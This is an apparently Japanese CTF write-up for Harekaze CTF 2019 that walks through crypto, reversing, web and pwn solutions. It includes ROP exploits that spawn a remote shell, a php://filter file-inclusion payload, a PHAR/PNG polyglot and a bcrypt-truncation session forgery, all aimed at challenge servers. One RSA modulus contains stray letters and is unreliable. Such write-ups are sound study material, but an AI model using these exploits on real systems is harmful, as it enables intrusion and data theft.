---
date: 2019-05-23T19:37:00.000+09:00
slug: harekaze-ctf-2019-writeup
title: Harekaze CTF 2019 Writeup

---

# ONCE UPON A TIME (Crypto 100pts)


Mod 251 の上で連立方程式を解く。左から掛けたか右から掛けたかは分からないので両方試す。


```python
enc = 'ea5929e97ef77806bb43ec303f304673de19f7e68eddc347f3373ee4c0b662bc37764f74cbb8bb9219e7b5dbc59ca4a42018'
enc = enc.decode('hex')
G = GF(251)
M = Matrix(G, 5)
for i in xrange(0,25):
    M[i // 5, i % 5] = ord(enc[i])

m2 = [[1,3,2,9,4], [0,2,7,8,4], [3,4,1,9,4], [6,5,3,-1,4], [1,4,5,3,5]]
m2 = Matrix(G, m2)
ret= ''
for row in M / m2:
    ret += ''.join(map(lambda a: chr(int(a)), list(row)))

M = Matrix(G, 5)
for i in xrange(0,25):
    M[i // 5, i % 5] = ord(enc[i + 25])

m2 = [[1,3,2,9,4], [0,2,7,8,4], [3,4,1,9,4], [6,5,3,-1,4], [1,4,5,3,5]]
m2 = Matrix(G, m2)
for row in M / m2:
    ret += ''.join(map(lambda a: chr(int(a)), list(row)))
print(ret)
```


```python
$ sage solve.sage
Op3n_y0ur_3y3s_1ook_up_t0_th3_ski3s_4nd_s33%%%%%%%
```


# Scramble (Reverse 100pts)


とりあえず angr に投げてみたらフラグが出た。


```python
import angr

project = angr.Project('./scramble')
entry = project.factory.entry_state()
simgr = project.factory.simgr(entry)
simgr.explore()

states = simgr.deadended
for state in states:
    flag = b"".join(state.posix.stdin.concretize())
    print(flag)
```


```text
(angr) angr@4a3bbfa7af32:/work$ python solve.py
b'\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xc9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9Y\xd9\xd9\xd9\xd9\xd9\xd9\xd9\xd9'
b'@ardJ`0D\x00D\x02\x1b\x13J"\x00y\x1bh\x04\x02\x00h\x00\x00\x00\x01\x01\x00\x04\x0c\xa0\x01\x00\x00\x01\x01\x01'
b'Harek!:eBTF{3nj0y\x1bh\x04b3k0p\x11_a7f]2\x101\x19!\x01\x14'
b'Harek!zeCTF{3nj0y[h$r3k0x3_c7f]2019!\x01\x15'
b'HarekazeCTF{3nj0y_h4r3k4z3_c7f_2019!!}'
```


# Encode & Encode (Web 100pts)


出力側のチェックは`php://filter/convert.base64-encode/`を利用して回避し、入力側のチェックは JSON の文字列の unicode エスケープを利用して回避する。


```text
$ curl -s http://153.127.202.154:1001/query.php -H "Content-Type: application/json" -d '{"page":"\u0070\u0068\u0070\u003a\u002f\u002f\u0066\u0069\u006c\u0074\u0065\u0072\u002f\u0063\u006f\u006e\u0076\u0065\u0072\u0074\u002e\u0062\u0061\u0073\u0065\u0036\u0034\u002d\u0065\u006e\u0063\u006f\u0064\u0065\u002f\u0072\u0065\u0073\u006f\u0075\u0072\u0063\u0065\u003d\u002f\u0066\u006c\u0061\u0067"}' | jq -r .content | base64 -d
HarekazeCTF{turutara_tattatta_ritta}
```


# Baby ROP (pwn 100pts)


バイナリに`"/bin/sh"`が用意されているので、それを`pop rdi`してから system を呼び出す。


```ruby
rp = [0x00400683, # pop rdi
      0x601048, #/bin/sh
      0x4005e3 # system
].pack("Q*")
require 'ctf'

TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.print 'a' * 24 + rp
    s.puts
    s.flush
    
    s.interactive!
end
```


```text
$ ruby exploit.rb problem.harekaze.com 20001
```


# Baby ROP 2 (pwn 200pts)


1 回目の ROP で、printf(read)を実行させて、libc のアドレスをリークさせ、main に戻す。
2 回目の ROP で、libc のアドレスを利用して system(“/bin/sh”)を実行する。


```ruby
rp = [0, 0x00400733, 0x601020 , 0x4004f0, 0x400636].pack("Q*")
require 'ctf'

read_ptr = 0x00000000000f7250

TCPSocket.open(*ARGV) do |s|
    s.echo = true
    s.puts 'a' * 32 + rp
    s.flush
    s.expect("H!\n")
    lc = s.expect(/What/)[0]
    libc_base = ((lc[0...-4] + "\0" * 8).unpack1('q') - read_ptr)
    rp = [0, 0x00400733, 0x0018cd57 + libc_base, 0x0000000000045390 + libc_base].pack('Q*')

    s.puts 'a' * 32 + rp
    s.flush

    s.interactive!
end
```


```text
$ ruby exploit.rb problem.harekaze.com 20005
```


# show me your private key(Crypto 200pts)


Crypto.PublicKey.RSA の construct を利用することで、n, e, d から RSA の素因数 p, q が得られる。


mod p に対しては位数から 1/e 乗は簡単にできるので、計算するとフラグが得られる。フラグが mod p より大きい場合は mod q も求めて CRT すれば良い。


```python
from Crypto.Util.number import long_to_bytes
from Crypto.PublicKey import RSA

(n, e, d) = (9799080661501467884467225188078342742766492539290ls954649052326288545249523485259554498055327101620585612049935019772095457875188392850174807669467113561703L, 65537, 357800937225887859492043729115941745631326069953205890949878950951199812467762505076908807818483545413271956081271375834809278508559178715879283048960953)
Cx = 4143446088312921816758362264853048120154280049677909632349103364802575463576509561464947871773793787896063253331418475283720886100034333135184249344102365
Cy = 8384037709829308179633895299138296616530497125381624381678499818112417287445046103971322133573513084823937517071462947639275474462359445732327289575301489
key = RSA.construct((long(n), long(e), long(d)))
p = key.p
b = (pow(Cy, 2, n) - pow(Cx, 3,n)) % p

EC = EllipticCurve(Zmod(p), [0, b])
pt = (EC([Cx,Cy])) * (Mod(e, EC.order())^-1).lift()
print long_to_bytes(pt[1]) + long_to_bytes(pt[0]) 
```


```text
$ sage solve.sage
HarekazeCTF{dynamit3_with_a_las3r_b3am}
```


# One Quadrillion (Crypto 200pts)


Pad 後が”9.+“になるようなハッシュから前に 2 ブロック”99999999999999”を追加することができる。


具体的には 9 回問題を解いて、そのハッシュに対して Extension する。


まず最初のプログラムで問題を解いて 9 のハッシュ値を取得した。


```ruby
first = '5998685417598565999201814640000000000000000'
while true
    answer = first[5, 4].to_i + first[19, 4].to_i
    first = `curl -s 'http://153.127.202.154:3001/#' -d 'progress=#{first}&answer=#{answer}'`.scan(/([0-9]{43})/)[0][0]
    puts first
    STDOUT.flush
end
```


次のプログラムで 9999999999999999 の時のセッションを作成した。


```ruby
T = [5676567,  858051, 5476703,  265259,
4058727, 5112531,  964143, 1099579,
8277687, 8717411, 2022783, 7207499,
1997447, 5864691,  828623, 3917019]

def hash2()
    d = '2221469830161720618728037424000000000000009'
    v = d.chars.each_slice(7).map{|a|a.join.to_i}[0, 4]
    i = 7
    2.times do
        s = 9999999
        k = T[i%16]
        a = v[1 + i % 3]
        b = v[1 + (i + 1) % 3]
        c = v[1 + (i + 2) % 3]
        d = (a * b + b * c + s * c ^ k) % 10000000
        v = [(d + v[1]) % 10000000, (d | v[2]) % 10000000, (d * v[3]) % 10000000, d]
        i += 1
    end
    v.map{|a|'%07d' % a}.join
end

p hash2 + '9' * 15
```


# [a-z().] (Misc 400pts)


文字列の長さを利用して計算を行う。concat で加算、repeat で乗算が出来る。


```text
eval.name.sub().repeat(eval.name.sub().slice(eval.name.length).length).concat(eval.length).concat(eval.length).repeat(eval.name.concat(eval.name).length).concat(eval.length).length
```


# Now We Can Play!! (Crypto 200pts)


復号結果に 3**rand(2**16..2**17)をかけ算したものが与えられる。全パターン戻してみて Harekaze から始まるものを表示する。


```ruby
require 'ctf'
include CTF::Math
TCPSocket.open(*ARGV) do |s|
    s.echo = true
    p = s.expect(/(\d+)L/)[1].to_i
    c = s.expect(/\((\d+)L, (\d+)L\)/)[1, 2].map{|a|a.to_i}
    s.puts c[0]
    s.puts c[1]
    d = s.expect(/(\d+)L/)[1].to_i
    
    inv = mod_inverse(3, p)
    d = d * inv.pow(2**16, p) % p
    ((2**16)..(2**17)).each do |i|
        d = d * inv % p
        if [d.to_s(16)].pack("H*").start_with?('Harekaze')
            puts [d.to_s(16)].pack("H*")
        end        
    end
end
```


```text
$ ruby solve.rb problem.harekaze.com 30002
HarekazeCTF{im_caught_in_a_dr3am_and_m7_dr3ams_c0m3_tru3}
```


# Avatar Uploader 1 (Misc 100pts)


PHP の `getimagesize` で PNG にならずに `mimeinfo` で PNG になるようなファイルを探す問題。


`mimeinfo`は libmagic を画像ファイルの判定に利用し、`getimagesize`は PHP の独自の判定ルーチンで画像を特定する。


getimagesize の方のソースコードを読んでみると、https://github.com/php/php-src/blob/879cd0491399ccfacac0d6ed701d998a65a6cc97/ext/standard/image.c#L323 適当な長さで切ってやれば`mimeinfo`と異なる結果を返しそうに見えるので、送信してみたところフラグが得られた。


送信したファイル:


```text
$ xxd test2.png
00000000: 8950 4e47 0d0a 1a0a 0000 000d 4948 4452  .PNG........IHDR
00000010: 0000 00b4 0000 00b4                      ........
```


# Avatar Uploader 2 (Web 300pts)


ヒントにあった通り、セッションの署名に`password_hash` が利用されていて、PASSWORD_BCRYPT は最大 72 文字に切り詰められる。これを利用して、セッションの JSON をコントロールできる。


```text
    57      return password_hash($this->secret . $string, PASSWORD_BCRYPT);
```


セッションのコントロールによって、次のテーマ読み込み箇所で任意の文字列を include させることができるようになるが、最後に’.css’となるファイルはアップロードできない。


```text
    25  <?php include($session->get('theme', 'light') . '.css'); ?>
```


次のスクリプトで PNG ファイルとして判断されるような、PHAR を作成して,それを読み込ませることで対応した。


```php
<?php
    $phar = new Phar('exploit.phar');
    $phar->startBuffering();
    $phar->addFromString('test', 'test');
    $fp = fopen('header', 'rb');
    $bin = fread($fp, 64);

    $phar->setStub($bin . '<?php __HALT_COMPILER(); ? >');
    $fp = fopen('img/hoge.css', 'rb');
    $phar['hoge.css'] = $fp;
    $phar->stopBuffering();
```


# twenty-five (Crypto 100pts)


辞書として、`reserved.txt`が与えられているのでバックトラックでマッチするような置換を求める。
ただし、問題で渡される`reserved.txt`は何故か不完全で
解が出ないので、http://www.namazu.org/~takesako/ppencode/demo.html から辞書を作り直す必要があった。


```ruby
def check2(word, dict)
    dict.each do |d|
        if d.size == word.size
            ok = true
            word.size.times do |i|
                next if word[i] == '?'
                if word[i] != d[i]
                    ok = false
                    break
                end
            end
            return true if ok
        end
    end
    return false
end

def check(cry, dict, sub)
    cry.all?{|a| check2(a.tr('abcdefghijklmnopqrstuvwxy', sub), dict)}
end

def solve(cry, dict, sub='?'*25)
    idx = [*0..25].select{|i|sub[i] == '?'}.first
    ret = nil
    if idx
        25.times do |i|
            next_sub = sub.dup
            next_sub[idx] = (?a.ord + i).chr
            cc = next_sub.gsub('?', '').chars
            next if cc.sort.uniq != cc.sort
            ret ||= solve(cry, dict, next_sub) if check(cry, dict, next_sub)
        end
        return ret
    else
        return sub
    end
end

cry = File.read('crypto.txt').split.uniq.sort
dict = File.read('reserved.txt').split.uniq.sort

sub = solve(cry, dict)
File.write('result.txt', File.read('crypto.txt').split.join(' ').tr('abcdefghijklmnopqrstuvwxyz', sub))
system 'perl result.txt'
```

